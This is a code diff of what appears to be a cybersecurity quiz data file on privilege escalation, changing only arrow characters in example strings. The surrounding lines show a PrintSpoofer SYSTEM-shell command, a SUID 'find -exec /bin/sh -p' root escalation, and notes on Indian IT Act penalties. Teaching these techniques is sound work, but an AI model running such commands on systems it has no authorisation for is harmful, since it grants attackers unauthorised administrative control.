@@ -22,7 +22,7 @@ PrintSpoofer.exe -i -c cmd.exe
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe created: \\\\.\\pipe\\PrintSpoofer\\pipe\\spoolss
 [+] Spawning process with SYSTEM token...
-whoami -> nt authority\\system!`
+whoami → nt authority\\system!`
   },
   {
     question: "What is an 'Unquoted Service Path' vulnerability on Windows, and how does the operating system's space-handling behavior allow privilege escalation?",
@@ -45,7 +45,7 @@ Result: On service restart, Windows executes Development.exe with SYSTEM privile
 find / -perm -4000 2>/dev/null # Discovers /usr/bin/find with SUID bit
 /usr/bin/find . -exec /bin/sh -p \\; -quit
 # id
-uid=1000(mamata) gid=1000(mamata) euid=0(root) -> ROOT SHELL!`
+uid=1000(mamata) gid=1000(mamata) euid=0(root) → ROOT SHELL!`
   },
   {
     question: "What is 'Sudo Misconfiguration' (`sudo -l` with `NOPASSWD:`), and how does an attacker leverage it to execute root commands?",
@@ -206,8 +206,8 @@ root`
     hint: "Remember the severe 10-year prison sentence under Section 70 for hacking protected critical infrastructure.",
     level: "basic",
     codeExample: `// Indian IT Act 2000 Prosecution for Lateral Pivoting:
-Privilege Escalation on Server    -> Section 66 (Up to 3 Years Prison + Fine)
-Lateral Pivot to Core Bank Switch -> Section 70 Protected System (Up to 10 YEARS RIGOROUS IMPRISONMENT!)`
+Privilege Escalation on Server    → Section 66 (Up to 3 Years Prison + Fine)
+Lateral Pivot to Core Bank Switch → Section 70 Protected System (Up to 10 YEARS RIGOROUS IMPRISONMENT!)`
   },
   {
     question: "Synthesizing Privilege Escalation and Lateral Movement: what is the ultimate strategic lesson for enterprise cybersecurity defense?",
